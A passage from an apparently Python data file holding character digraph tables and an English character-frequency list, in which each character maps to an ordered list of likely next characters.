'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'V': ['i', 'e', 'E', 'o', 'a', 'I', 'A', 'O', '.', '-', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'Y': ['o', 'e', ' ', 'a', 'O', 'T', "'", ',', 'S', 'E', 'I', 'M', '.', 'u', '!', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'N', 'P', 'Q', 'R', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'X': ['E', '!', ' ', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '[': ['G', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'Z': ['e', 'a', 'o', 'u', 'z', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', '{', '|', '}', '~'], ']': [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '_': [' ', '.', 'y', 'h', 'S', 'm', 't', ',', 'I', 'w', 'i', 's', 'H', 'a', '"', 'N', 'T', 'W', 'Y', 'd', 'n', 'p', 'u', '?', 'C', 'B', 'E', 'M', 'c', 'b', 'o', '!', '#', '$', '%', '&', "'", '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '@', 'A', 'D', 'F', 'G', 'J', 'K', 'L', 'O', 'P', 'Q', 'R', 'U', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'e', 'f', 'g', 'j', 'k', 'l', 'q', 'r', 'v', 'x', 'z', '{', '|', '}', '~'], 'a': ['n', 't', 's', 'r', 'l', ' ', 'd', 'i', 'c', 'y', 'g', 'v', 'm', 'b', 'k', 'p', 'u', 'w', 'f', 'z', ',', '.', "'", 'x', '-', 'h', 'j', '!', 'e', 'o', '?', 'a', ':', ';', 'q', '&', ')', '"', 'T', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~'], 'c': ['o', 'h', 'e', 'a', 'k', 't', 'i', 'l', 'r', 'u', 'y', 'c', ' ', 'q', 's', '.', ',', '-', ';', '!', ')', "'", '?', 'd', 'I', '&', ':', 'm', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'f', 'g', 'j', 'n', 'p', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'b': ['e', 'l', 'o', 'u', 'a', 'r', 'y', 'i', 's', 'b', 't', 'j', ' ', ',', 'm', '.', 'd', "'", '-', 'v', '?', 'n', ';', ':', 'h', '!', '&', ')', 'f', 'w', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'c', 'g', 'k', 'p', 'q', 'x', 'z', '{', '|', '}', '~'], 'e': [' ', 'r', 'n', 'd', 's', 'a', 'l', 'e', 't', ',', 'm', '.', 'v', 'c', 'y', 'p', 'f', 'i', 'w', 'x', "'", 'g', '-', 'o', '?', ';', 'h', 'k', '!', 'b', 'q', ':', 'u', 'j', 'z', '&', '_', ')', 'I', '"', 'B', 'J', 'P', 'T', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'C', 'D', 'E', 'F', 'G', 'H', 'K', 'L', 'M', 'N', 'O', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', '{', '|', '}', '~'], 'd': [' ', 'e', 'i', 'o', ',', '.', 'a', 's', 'r', 'y', 'd', 'n', 'l', 'u', '-', 'g', ';', "'", 'm', 'v', ':', '?', '!', 'f', 'w', 'h', 'b', 'j', ')', 'p', 'k', 't', '&', 'c', '_', 'q', 'I', 'T', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'x', 'z', '{', '|', '}', '~'], 'g': [' ', 'h', 'e', 'o', 'i', 'a', 'g', 'r', ',', 'l', 's', '.', 'u', 'n', '-', "'", 'y', ';', 't', '?', ':', 'm', '!', '&', 'p', 'f', '"', ')', 'b', 'w', 'T', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'c', 'd', 'j', 'k', 'q', 'v', 'x', 'z', '{', '|', '}', '~'], 'f': [' ', 'o', 'e', 'a', 'i', 'r', 'u', 'f', 't', 'l', ',', '.', '-', 'y', 's', ';', '?', ':', 'p', '!', 'h', '&', 'm', 'n', "'", ')', 'w', 'I', 'T', '_', 'b', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'c', 'd', 'g', 'j', 'k', 'q', 'v', 'x', 'z', '{', '|', '}', '~'], 'i': ['n', 't', 's', 'l', 'd', 'e', 'c', 'm', 'o', 'r', 'g', 'f', 'v', 'k', 'a', 'p', 'b', 'z', 'x', "'", 'u', ' ', 'q', '-', ',', 'h', '.', '&', '!', ')', ':', '?', '_', 'j', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ';', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'i', 'w', 'y', '{', '|', '}', '~'], 'h': ['e', 'a', 'i', ' ', 'o', 't', ',', 'u', 'r', 'y', '.', 'n', 's', '-', 'l', 'm', '!', 'b', "'", '?', ';', 'f', 'w', ':', 'd', 'h', 'q', 'c', '&', ')', 'p', 'I', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'g', 'j', 'k', 'v', 'x', 'z', '{', '|', '}', '~'], 'k': ['e', ' ', 'i', 'n', ',', 's', '.', 'y', 'l', '-', 'a', "'", '?', 'f', ';', 'w', '!', 'o', 'm', 'r', ':', 'h', 'c', 'g', 'u', 'b', 't', 'p', '&', 'd', '"', '#', '$', '%', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'j', 'k', 'q', 'v', 'x', 'z', '{', '|', '}', '~'], 'j': ['u', 'e', 'o', 'a', 'i', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'm': ['e', 'a', ' ', 'o', 'i', 'y', 'p', 'u', ',', 's', '.', 'b', 'm', "'", 'n', ';', '-', '?', 'f', 'l', '!', ':', 'r', 't', '&', '_', 'c', ')', 'w', 'h', 'v', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'd', 'g', 'j', 'k', 'q', 'x', 'z', '{', '|', '}', '~'], 'l': ['e', 'l', 'i', ' ', 'y', 'o', 'd', 'a', 'f', ',', 'u', 't', 's', '.', 'k', 'm', 'w', 'v', 'p', '-', 'b', 'c', 'r', 'n', '?', ';', "'", '!', 'g', ':', 'h', '&', ')', '_', 'I', 'P', 'T', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'j', 'q', 'x', 'z', '{', '|', '}', '~'], 'o': ['u', 't', 'n', ' ', 'r', 'f', 'm', 'w', 'o', 'l', 's', 'k', 'v', 'd', 'p', 'i', 'c', 'b', ',', 'a', 'g', "'", '.', 'y', 'e', '-', 'x', 'h', '?', '!', ';', 'z', 'q', ':', 'j', '_', '&', '"', 'C', 'I', '#', '$', '%', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', '{', '|', '}', '~'], 'n': [' ', 'd', 'g', 'e', 't', 'o', 'c', 's', "'", 'i', ',', 'a', '.', 'y', 'k', 'l', 'n', 'f', 'u', 'v', '-', ';', '?', 'w', 'j', 'q', 'r', 'b', '!', 'x', 'm', 'h', ':', 'p', 'z', '&', ')', 'I', '"', 'N', 'T', '_', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', '{', '|', '}', '~'], 'q': ['u', '.', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], 'p': ['e', 'o', 'a', 'r', 'l', ' ', 'i', 'p', 'u', 't', 's', 'h', ',', '.', 'y', "'", '-', ';', 'w', '?', '!', 'b', 'n', 'm', ':', 'k', '&', 'f', 'c', '"', 'T', '#', '$', '%', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'd', 'g', 'j', 'q', 'v', 'x', 'z', '{', '|', '}', '~'], 's': [' ', 't', 'e', 'h', 'a', 'o', 'i', 's', ',', '.', 'u', 'p', 'c', 'l', 'm', 'k', 'n', 'w', 'y', ';', '?', 'b', '!', "'", ':', '-', 'f', 'g', 'q', '&', 'd', ')', 'r', '_', 'I', 'j', '"', 'A', 'M', 'v', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'x', 'z', '{', '|', '}', '~'], 'r': ['e', ' ', 'o', 'i', 'a', 's', 't', 'y', 'd', '.', ',', 'r', 'n', 'u', 'l', 'm', 'k', 'c', 'g', 'v', 'p', 'f', "'", '-', 'h', ';', '?', 'b', 'w', '!', ':', '&', '_', ')', 'j', '"', 'C', 'I', 'q', 'x', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'z', '{', '|', '}', '~'], 'u': ['o', 't', 's', 'l', 'r', 'n', ' ', 'g', 'p', 'c', 'e', 'i', 'm', 'd', 'a', 'b', "'", ',', '.', 'f', '?', 'k', 'y', 'z', ';', 'x', '!', '-', '_', 'v', 'w', ':', '&', 'h', 'q', 'I', '"', '#', '$', '%', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'j', 'u', '{', '|', '}', '~'], 't': ['h', ' ', 'o', 'e', ';', 'i', 'a', 'r', 't', ',', '.', 's', 'l', 'u', 'y', "'", 'w', 'c', '-', '?', 'n', 'm', '!', 'f', ':', 'b', '&', 'g', 'z', 'p', 'I', 'd', ')', '_', 'k', '"', '(', 'T', ']', '#', '$', '%', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', '^', '`', 'j', 'q', 'v', 'x', '{', '|', '}', '~'], 'w': ['a', 'i', 'h', 'e', 'o', ' ', 'n', ',', 'r', 's', '.', 'l', '-', '?', 'f', ';', 'd', 'y', 'k', '!', "'", 'u', ':', 't', 'b', 'c', ')', '&', '_', 'm', 'I', 'q', 'p', '"', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'g', 'j', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'v': ['e', 'i', 'a', 'o', 'y', 'u', ' ', 'r', 'b', '.', 'v', 's', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'm', 'n', 'p', 'q', 't', 'w', 'x', 'z', '{', '|', '}', '~'], 'y': [' ', 'o', ',', '.', 'e', 's', 'i', 't', "'", '-', ';', 'b', '?', 'm', 'a', '!', ':', 'p', 'd', 'l', 'v', 'f', 'w', 'n', 'c', 'r', 'h', '&', ')', 'g', '_', 'z', 'y', 'k', '"', 'I', 'O', 'j', 'x', '#', '$', '%', '(', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'L', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '`', 'q', 'u', '{', '|', '}', '~'], 'x': ['p', 'c', 't', 'i', 'e', 'a', ' ', ',', 'h', 'u', '.', '-', 'o', 'q', 'f', 'y', '?', 'g', '!', "'", ';', 'n', '"', '#', '$', '%', '&', '(', ')', '*', '+', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'd', 'j', 'k', 'l', 'm', 'r', 's', 'v', 'w', 'x', 'z', '{', '|', '}', '~'], 'z': ['e', 'z', 'i', ' ', 'l', 'y', ',', 'a', 'o', '.', "'", 'u', '?', ';', ':', 's', '!', 't', '"', '#', '$', '%', '&', '(', ')', '*', '+', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '<', '=', '>', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'b', 'c', 'd', 'f', 'g', 'h', 'j', 'k', 'm', 'n', 'p', 'q', 'r', 'v', 'w', 'x', '{', '|', '}', '~']}
characters_by_freq_english_no_nl = [' ', 'e', 't', 'o', 'a', 'n', 'i', 'h', 's', 'r', 'l', 'd', 'u', 'm', 'w', 'g', 'f', 'c', 'y', ',', 'p', '.', 'b', 'v', 'k', ';', "'", 'q', '&', 'I', '-', 'T', 'M', 'S', 'A', '"', 'H', '?', 'B', 'W', 'x', 'E', 'Y', '!', 'L', 'j', 'D', 'N', 'O', 'P', 'G', 'C', 'J', ':', 'R', 'z', 'F', 'K', 'V', '_', 'U', ')', '(', '>', '1', '0', 'Q', 'Z', '9', '4', '7', '2', '8', '3', '5', '6', '#', 'X', '*', '[', ']']

diagraphs_test_server = {'!': [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], ' ': ['t', 'a', 'o', 's', 'd', 'w', 'b', 'i', 'f', 'I', 'm', 'y', 'l', 'g', 'r', 'c', 'h', 'n', 'W', 'T', 'e', 'A', 'p', 'D', 'u', 'S', '-', 'B', 'k', 'j', 'E', 'F', 'M', 'O', 'N', '2', '4', '6', '9', 'C', 'G', 'H', 'K', 'L', 'Y', 'q', 'v', 'z', ' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '.', '/', '0', '1', '3', '5', '7', '8', ':', ';', '<', '=', '>', '?', '@', 'J', 'P', 'Q', 'R', 'U', 'V', 'X', 'Z', '[', '\\', ']', '^', '_', '`', 'x', '{', '|', '}', '~'], '%': [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '-': [' ', '-', 'r', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], ',': [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '.': [' ', '.', 's', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '3': ['%', ' ', '!', '"', '#', '$', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '2': ['%', ' ', '!', '"', '#', '$', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '4': ['%', ' ', '!', '"', '#', '$', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~'], '6': ['%', ' ', '!', '"', '#', '$', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', 